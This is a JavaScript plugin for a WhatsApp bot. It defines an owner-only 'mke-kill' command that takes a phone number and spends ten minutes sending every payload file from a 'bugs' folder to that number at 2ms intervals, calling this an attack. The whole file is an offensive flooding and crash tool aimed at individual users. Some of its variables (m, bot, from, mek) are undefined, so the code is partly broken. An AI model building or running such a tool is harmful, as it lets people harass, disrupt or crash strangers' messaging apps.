const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'mke-kill',
  desc: '🔪 MKE Kill - 10-minute ultra-speed attack',
  category: 'bug',
  react: '🔪',
  filename: __filename
}, async (client, message, args, { reply, isOwner }) => {
  if (!isOwner) return reply("❌ This command is for the bot *owner only*.");

  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'mke-kill') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await reply(`❌ Usage:\n${prefix}mke-kill <number>`);
    }

    const protectedNumbers = ['50941350366', '50938091691', '13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await reply('🛡️ This number is protected. Attack denied.');
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsPath = path.join(__dirname, '../bugs');
    const bugFiles = fs.readdirSync(bugsPath).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 No payloads found in the `/bugs` folder.');
    }

    // Send image first
    const imgPath = path.join(__dirname, '../media/5.png');
    const imgBuffer = fs.readFileSync(imgPath);
    await bot.sendMessage(from, {
      image: imgBuffer,
      caption: `🩸 *mke Kill Activated*\n👤 Target: wa.me/${targetNumber}\n⏱️ Duration: 10 minutes\n⚡ Speed: Ultra\n📦 Payloads: ${bugFiles.length}`,
    }, { quoted: mek });

    const endTime = Date.now() + 10 * 60 * 1000;

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const filePath = path.join(bugsPath, file);
          let payload = require(filePath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            const msg = payload.default;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'string') {
            const msg = payload;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'function') {
            await payload(bot, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        await new Promise(res => setTimeout(res, 2)); // 2ms delay for fast execution
      }
    }

    await reply(`✅ *mke-kill* finished with +${targetNumber}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});